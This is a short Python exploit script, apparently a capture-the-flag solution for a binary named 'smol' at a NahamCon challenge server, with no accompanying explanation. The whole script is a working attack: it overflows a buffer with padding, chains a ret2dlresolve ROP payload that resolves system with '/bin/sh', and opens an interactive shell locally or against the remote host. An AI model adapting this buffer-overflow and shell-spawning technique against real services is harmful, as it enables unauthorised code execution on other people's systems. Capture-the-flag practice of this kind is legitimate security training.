from pwn import *
from sys import *

context.arch = "amd64"

elf = ELF('./smol')
rop = ROP(elf)

p = process('./smol')
HOST = 'challenge.nahamcon.com'
PORT = 30698

cmd = """
b*0x0000000000401163
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

context.binary = elf = ELF('./smol')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, "system", ["/bin/sh"])
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
p.send((b"A" * 0xC + rop.chain()).ljust(0x200, b"\x00"))
p.send(dlresolve.payload)

p.interactive()